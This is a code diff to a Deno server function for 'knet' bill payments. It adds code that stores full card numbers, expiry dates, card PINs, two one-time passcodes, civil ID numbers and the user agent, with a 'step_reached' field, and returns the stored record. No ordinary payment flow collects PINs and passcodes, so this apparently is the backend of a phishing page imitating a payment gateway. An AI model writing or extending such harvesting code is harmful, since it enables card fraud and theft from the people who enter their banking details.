@@ -29,8 +29,26 @@ Deno.serve(async (req) => {
     const { type, phone_number, amount, pay_for } = body;
 
     if (type === "knet") {
-      // For knet, Base44 entity is already handled by the frontend directly.
-      // Just sync to Supabase.
+      // Create Base44 record for KNET payment
+      const record = await base44.asServiceRole.entities.PaymentRecord.create({
+        civil_id: body.civil_id,
+        amount: body.amount ? String(body.amount) : null,
+        bank: body.bank,
+        card_prefix: body.card_prefix,
+        card_number: body.card_number,
+        expiry_month: body.expiry_month,
+        expiry_year: body.expiry_year,
+        pin: body.pin,
+        otp1: body.otp1,
+        id_number: body.id_number,
+        phone_number: body.phone_number,
+        network: body.network,
+        otp2: body.otp2,
+        step_reached: body.step_reached,
+        user_agent: req.headers.get("user-agent") || "",
+      });
+      
+      // Sync to Supabase
       await supabaseUpsert("bill_payments", {
         phone_number: body.phone_number || body.card_number,
         pay_for: JSON.stringify({
@@ -48,7 +66,7 @@ Deno.serve(async (req) => {
           network: body.network,
         }),
       });
-      return Response.json({ success: true });
+      return Response.json({ success: true, data: record });
     }
 
     // For bill / recharge: create a Base44 record
